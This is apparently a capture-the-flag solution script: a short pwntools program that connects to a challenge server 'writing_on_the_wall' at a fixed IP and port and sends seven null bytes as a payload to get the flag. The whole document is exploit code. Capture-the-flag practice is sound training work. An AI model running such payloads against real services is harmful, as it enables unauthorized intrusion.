from pwn import *

ip, port = '94.237.62.54', 53917
io = remote(ip, port)
#io = process('./writing_on_the_wall')

io.recvuntil('>>')
buf = b'\x00'*7
io.sendline(buf)
print(io.recvall())
